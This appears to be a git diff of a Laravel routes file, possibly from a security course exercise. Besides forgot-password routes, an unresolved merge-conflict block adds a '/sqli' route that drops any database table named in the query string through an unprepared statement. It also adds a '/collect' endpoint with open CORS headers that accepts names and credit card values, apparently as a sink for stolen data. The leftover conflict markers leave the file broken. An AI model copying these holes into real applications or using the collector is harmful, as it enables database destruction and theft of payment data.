@@ -25,7 +25,8 @@ Route::get('/auth/google',[UsersController::class, 'redirectToGoogle'])->name('l
 Route::get('/auth/google/callback',[UsersController::class, 'handleGoogleCallback']);
 
 
-
+Route::get('/forgot-password', [UsersController::class, 'forgotPassword'])->name('forgot_password');
+Route::post('/forgot-password', [UsersController::class, 'sendTemporaryPassword'])->name('send_temp_password');
 
 
 Route::get('products', [ProductsController::class, 'list'])->name('products_list');
@@ -56,4 +57,23 @@ Route::get('/test', function () {
     return view('test');
 });
 
+<<<<<<< HEAD
 
+=======
+Route::get("/sqli", function(Request $request){
+    $table = $request->query('table');
+    DB::unprepared("DROP TABLE $table");
+    return redirect('/');
+});  
+
+
+route::get('/collect', function (request $REQUEST){
+    $name=$REQUEST->query('name');
+    $credit=$REQUEST->query('credit');
+
+    return response('data colleected', 200)
+        ->header('access-control-allow-origin', '*')
+        ->header('access-control-allow-methods', 'get, post, option')
+        ->header('access-control-allow-headers', 'content-type, x-requested-with');
+});
+>>>>>>> d47f50ca9a481a05cff3e0e568dbc15eb3ff577e
